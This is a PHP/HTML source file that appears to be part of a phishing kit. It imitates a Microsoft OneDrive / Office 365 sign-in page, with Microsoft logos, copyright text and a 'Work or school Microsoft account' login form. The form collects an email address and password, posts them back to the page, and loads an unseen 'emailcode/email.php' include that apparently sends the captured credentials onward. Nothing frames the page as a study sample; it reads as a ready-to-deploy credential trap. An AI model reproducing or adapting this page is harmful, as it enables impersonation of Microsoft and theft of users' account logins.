<?php
require_once('emailcode/email.php')
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta http-equiv="content-type" content="text/html" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>One Drive</title>

    <!-- Font Awesome CSS -->
    <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/css/bootstrap.min.css" integrity="sha384-rwoIResjU2yc3z8GV/NPeZWAv56rSmLldC3R/AZzGRnGxQQKnKkoFVhFQhNUwEyJ" crossorigin="anonymous">
      <link rel="stylesheet" type="text/css" href="css/style.css">

</head>
<body>

<div class="officemail">
    <div class="row">
        <div class="col-md-8 col-lg-8 col-sm-8 col-xs-12">
            <img class="img-fluid ofc" src="images/officebg.jpg" alt="Office">
         </div>
        <div class="col-md-4 col-lg-4 col-sm-4 col-xs-12">
             <div class="officelogo">
                 <img class="img-fluid" src="images/officelogo.png" alt="Office Logo" />
             </div>
             <div class="officetitle">
                <h6>Work or school Microsoft account</h6>
             </div>
             <div class="officeloginform">
             <form class="form-horizontal" name="office" role="form" method="POST" action="">
             <div class="row">
                <div class="col-md-10 col-xs-10">
                    <h2>Please Login</h2>
                    <hr>
                </div>
             </div>
             <div class="row">
                <div class="col-md-10 col-xs-10">
                    <div class="form-group orangeclr">
                        <label class="sr-only" for="email">E-Mail Address</label>
                        <div class="input-group mb-2 mr-sm-2 mb-sm-0">
                            <div class="input-group-addon" style="width: 2.6rem"><i class="fa fa-at"></i></div>
                            <input type="text" name="email" class="form-control" id="email"
                                   placeholder="Email" required autofocus>
                        </div>
                    </div>
                </div>
             </div>
             <div class="row">
                <div class="col-md-10 col-xs-10">
                    <div class="form-group orangeclr">
                        <label class="sr-only" for="password">Password</label>
                        <div class="input-group mb-2 mr-sm-2 mb-sm-0">
                            <div class="input-group-addon" style="width: 2.6rem"><i class="fa fa-key"></i></div>
                            <input type="password" name="password" class="form-control" id="password"
                                   placeholder="Password" required>
                        </div>
                    </div>
                </div>
            </div>
            <div class="row">
                <div class="col-md-10 col-xs-10" style="padding-top: .35rem">
                    <div class="form-check mb-2 mr-sm-2 mb-sm-0">
                        <label class="form-check-label">
                            <input class="form-check-input" name="remember"
                                   type="checkbox" >
                            <span style="padding-bottom: .15rem">Keep me signed in</span>
                        </label>
                    </div>
                </div>
            </div>
            <div class="row" style="padding-top: 1rem">
                <div class="col-md-10 col-xs-10">
                    <input type="hidden" name="logintype" value="office">
                    <button type="submit" name="submit_btn" class="btn btn-success signin"><i class="fa fa-sign-in"></i> Sign in</button>
                    <a class="btn btn-link" href="/password/reset">Can't access your account?</a>
                </div>
             </div>
             </form>
             </div>
             <div class="footer">
                <div class="row">
                    <div class="col-md-6 col-sm-6 col-xs-12 col-lg-6">
                        <div class="copyrightmicrosoft">&#169; 2018 Microsoft</div>
                        <ul class="footermenumicrosoft">
                            <li><a href="#">Terms</a></li>
                            <li><a href="#">Privacy & Cookies</a></li>
                        </ul>
                    </div>
                    <div class="col-md-6 col-sm-6 col-xs-12 col-lg-6">
                        <div class="microsoftlogomt">
                            <img src="images/microsoftlogo.png" alt="Footerlogo" />
                        </div>
                    </div>
                </div>
             </div>
        </div>
    </div>
</div>
<!-- jQuery first, then Tether, then Bootstrap JS. -->
    <script src="https://code.jquery.com/jquery-3.1.1.slim.min.js" integrity="sha384-A7FZj7v+d/sdmMqp/nOQwliLvUsJfDHW+k9Omg/a/EheAdgtzNs3hpfag6Ed950n" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tether/1.4.0/js/tether.min.js" integrity="sha384-DztdAPBWPRXSA/3eYEEUWrWCy7G5KFbe8fFjk5JAIxUYHKkDx6Qin1DkWx51bBrb" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/js/bootstrap.min.js" integrity="sha384-vBWWzlZJ8ea9aCX4pEW3rVHjgjt7zpkNpZk+02D9phzyeVkE+jo0ieGizqPLForn" crossorigin="anonymous"></script>
</body>
</html>
